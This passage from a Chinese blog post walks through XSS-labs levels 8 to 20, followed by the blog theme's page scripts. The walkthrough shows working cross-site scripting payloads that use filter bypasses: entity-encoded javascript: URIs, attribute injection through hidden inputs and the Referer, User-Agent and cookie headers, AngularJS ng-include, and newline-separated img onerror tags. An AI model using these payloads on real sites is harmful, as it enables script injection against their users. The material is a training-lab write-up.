+<h2 id="level-8">level 8</h2>
+<p>定位一下，第一个参数在 input 标签的 value 属性中， 第二个参数在 a 标签的 href 属性中</p>
+<p>通过测试，发现在 input 标签的 value 属性中<code>&lt;&gt; &quot;</code>被 HTML 编码了，a 标签的 href 属性把<code>script、on、src、data、href</code>用<code>_</code>截断了，同时<code>&quot;</code>被 HTML 编码了</p>
+<p>使用大小写绕过也失败了，说明有 strtolower 函数。</p>
+<p>因为第二个参数在 <code>href</code>属性中，而<code>href</code>属性支持构造伪协议，但<code>script</code>被<code>_</code>所限制，于是尝试用编码的方式去绕过</p>
+<pre><code class="language-js">javascript:alert(1)
+
+&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;
+</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301771.png" alt="image-20230205213359970"></p>
+<center style="color:#C0C0C0;text-decoration:underline">HTML 编码</center>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301403.png" alt="image-20230205213924628"></p>
+<center style="color:#C0C0C0;text-decoration:underline">HTML 编码</center>
+<h2 id="level-9">level 9</h2>
+<p>定位参数，第一个参数照旧，第二个参数还是在 a 标签的 href 属性中</p>
+<p>用<code>javascript:alert(1)</code>测试，a 标签的 href 属性的值显示“您的链接不合法”</p>
+<p>一般而言，href 属性是要填 URL 的，那就补上一个<code>https://www.google.com</code></p>
+<p>输入<code>javascript:alert(1)//http://www.baidu.com</code>，从页面源代码处看到<code>script</code>被<code>_</code>截断了，那就 HTML 编码一下</p>
+<pre><code class="language-js">java&amp;#x73;cript:alert(1)//http://www.baidu.com
+// ｓ--&gt; &amp;#x73;
+</code></pre>
+<p>从 level9.php 可以观察到，如果没有<code>http://</code>字符，会输出链接不合法</p>
+<pre><code class="language-php">if(false===strpos($str7,'http://'))
+&#123;
+  echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
+        &#125;
+</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070301859.png" alt="image-20230205222944540"></p>
+<h2 id="level-10">level 10</h2>
+<p>从 URL 处输入测试参数，然后 CTRL+U 查看页面源代码发现有三个 input 标签，且 type=“hidden”，也就是隐藏表单。</p>
+<p>把三个 input 标签的类型修改为 text，看在页面的显示情况</p>
+<pre><code class="language-js">// 发现页面出现文本框，t_sort，这证明可对其进行突破
+text&amp;t_link=&quot; type=&quot;text&quot;&amp;t_history=&quot; type=&quot;text&quot;&amp;t_sort=&quot; type=&quot;text&quot;
+// 出现文本框后可直接注入 XSS 代码
+&quot; type=&quot;text&quot; onclick=&quot;alert('xss')
+</code></pre>
+<p>从源码看把<code>&lt;&gt;</code>替换为空了，这恐怕只能在标签内部通过新增属性的方式来答题了</p>
+<pre><code class="language-php">$str = $_GET[&quot;keyword&quot;];
+$str11 = $_GET[&quot;t_sort&quot;];
+$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
+$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
+</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302726.png" alt="image-20230205231017535"></p>
+<center style="color:#C0C0C0;text-decoration:underline">隐藏表单</center>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302997.png" alt="image-20230205232022117"></p>
+<center style="color:#C0C0C0;text-decoration:underline">点击 input 框触发 xss</center>
+<h2 id="level-11">level 11</h2>
+<p>查看源代码发现 t_ref 的 value 值为上道题的 URL，由此判断 value 值就是 referer，referer 用于告知服务器用户的来源页面，所以这道题直接篡改 referer 就可以了</p>
+<pre><code class="language-js">referer:&quot;type=&quot;text&quot; onclick=&quot;alert('xss')
+</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302112.png" alt="image-20230205234339999"></p>
+<center style="color:#C0C0C0;text-decoration:underline">页面源代码</center>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302765.png" alt="image-20230205235652379"></p>
+<center style="color:#C0C0C0;text-decoration:underline">点击 input 框触发 xss</center>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302809.png" alt="image-20230206104555183"></p>
+<center style="color:#C0C0C0;text-decoration:underline">源码</center>
+<h2 id="level-12">level 12</h2>
+<p>CTRL+U 查看源代码发现 t_ua 的 value 值为 User-Agent，也就是用户代理，通常<u>标识浏览器、及其版本号及其主机操作系统。</u></p>
+<pre><code class="language-js">User-Agent: &quot;type=&quot;text&quot; onclick=&quot;alert('xss')
+</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302842.png" alt="image-20230206110129002"></p>
+<center style="color:#C0C0C0;text-decoration:underline">User-Agent</center>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302164.png" alt="image-20230206110854396"></p>
+<center style="color:#C0C0C0;text-decoration:underline">点击 input 框触发 xss</center>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302616.png" alt="image-20230206111752715"></p>
+<center style="color:#C0C0C0;text-decoration:underline">源码</center>
+<h2 id="level-13">level 13</h2>
+<p>CTRL+U 查看源代码发现 t_cook 的 value 值为<code>call me maybe?</code>，使用浏览器插件 Cookie Editor 查看 cookie 的值与之相似，于是判定 value 值就是 cookie</p>
+<pre><code class="language-js">user=&quot; type=&quot;text&quot; onclick=&quot;alert('xss')
+</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302599.png" alt="image-20230206112705363"></p>
+<center style="color:#C0C0C0;text-decoration:underline">对比查看是 cookie</center>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302676.png" alt="image-20230206114627950"></p>
+<center style="color:#C0C0C0;text-decoration:underline">修改 cookie</center>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302749.png" alt="image-20230206114435023"></p>
+<center style="color:#C0C0C0;text-decoration:underline">点击 input 框触发 xss</center>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302078.png" alt="image-20230206115009464"></p>
+<center style="color:#C0C0C0;text-decoration:underline">源码</center>
+<h2 id="level-14">level 14</h2>
+<p>网页一直在响应，最终以失败告终，查看源码发现原链接已经失效</p>
+<p>这关主要考察<strong>Exif</strong>，Exif 记录着照片的属性信息和拍摄数据，可以更改图片的参数把一张恶意的图片传到可执行该信息的网站</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302579.png" alt="image-20230206141745299"></p>
+<h2 id="level-15">level 15</h2>
+<p>查看页面源码，最底部有一行 span 标签，class 属性是<code>ng-include</code></p>
+<pre><code class="language-html">&lt;span class=&quot;ng-include:&quot;&gt;&lt;/span&gt;
+</code></pre>
+<p>查询了一下得知是前端框架 angular js 里面的，含义是文件包含</p>
+<p>于是可以把本地文件<code>level1.php</code>包含起来让其执行 XSS</p>
+<pre><code class="language-js">?src='level1.php?name=&lt;img src=1 onerror=alert(1)&gt;'
+</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302875.png" alt="image-20230206144155192"></p>
+<h2 id="level-16">level 16</h2>
+<p>用<code>&lt;script&gt;alert('xss')&lt;/script&gt;</code>测试，查看页面源代码，发现参数值在 center 标签中，而用于构造 XSS 的<code>script、/、空格</code>被替换为了<code>&amp;nbsp;</code></p>
+<p><code>/</code>被编码这意味着像是<code>&lt;&gt;&lt;/&gt;</code>需要闭合的标签用不了，所以想到了<code>&lt;img&gt;</code>这种自闭和的标签</p>
+<ul>
+<li><code>换行符 --URL编码后--&gt; %0a</code></li>
+</ul>
+<pre><code class="language-js">// 直接输入发现“空格”被替换为了 &amp;nbsp; 因此考虑用 %0a 即换行符绕过空格
+&lt;img src=”1” onerror=alert(‘xss’)&gt;
+
+&lt;img%0asrc=1%0aonerror=alert(1)&gt;
+
+&lt;img
+src=”1”
+onerror=alert(‘xss’)
+&gt;
+</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302520.png" alt="image-20230206153316257"></p>
+<center style="color:#C0C0C0;text-decoration:underline">URL 解码</center>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302800.png" alt="image-20230206161408186"></p>
+<center style="color:#C0C0C0;text-decoration:underline">插入 XSS</center>
+<h2 id="level-17">level 17</h2>
+<p>在 URL 中填上参数<u><em><strong>?arg01=<code>1111</code>&amp;arg02=<code>2222</code></strong></em></u>，然后查看页面源代码，发现有个 embed 标签，填入的参数在 src 属性中进行了拼接</p>
+<blockquote>
+<p><code>&lt;embed&gt;</code>标签就是引入一个<code>swf</code>文件【<code>SWF</code>格式是动画软件<code>Flash</code>的专用格式】</p>
+</blockquote>
+<pre><code class="language-html">&lt;!-- 查看页面源代码 --&gt;
+&lt;embed src=xsf01.swf?1111=2222 width=100% heigth=100%&gt;&lt;h2 align=center&gt;
+</code></pre>
+<pre><code class="language-js">?arg01= onclick&amp;arg02=alert(‘xss’) //
+
+' &gt; onmouseover=alert(1)
+
+</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://favorably-7690.oss-cn-beijing.aliyuncs.com/xss-labs/202410070302031.png" alt="image-20230206162941254"></p>
+<center style="color:#C0C0C0;text-decoration:underline">火狐、Chrom、Edge 等浏览器已不支持 flash，所以不会弹窗</center>
+<h2 id="level-18">level 18</h2>
+<p>和 level 17 是一样的</p>
+<h2 id="level-19、20">level 19、20</h2>
+<p>IE 浏览器和 flash 均已被历史淘汰</p>
+
+<div class="article-footer fs14"></div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2023/02/26/DVWA-master/">DVWA 靶场</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2023/02/13/XSS%20Challenges/">XSS Challenges</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"><p>本站由 <a href="/">John Doe</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.1">Stellar 1.29.1</a> 主题创建。<br>
+本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#level-1"><span class="toc-text">level 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-2"><span class="toc-text">level 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-3"><span class="toc-text">level 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-4"><span class="toc-text">level 4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-5"><span class="toc-text">level 5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-6"><span class="toc-text">level 6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-7"><span class="toc-text">level 7</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-8"><span class="toc-text">level 8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-9"><span class="toc-text">level 9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-10"><span class="toc-text">level 10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-11"><span class="toc-text">level 11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-12"><span class="toc-text">level 12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-13"><span class="toc-text">level 13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-14"><span class="toc-text">level 14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-15"><span class="toc-text">level 15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-16"><span class="toc-text">level 16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-17"><span class="toc-text">level 17</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-18"><span class="toc-text">level 18</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-19%E3%80%8120"><span class="toc-text">level 19、20</span></a></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+  <script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js`,
+    marked: `https://cdn.jsdelivr.net/npm/marked@13.0.1/lib/marked.umd.min.js`
+  }
+  
+
+</script>
+
+    <script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
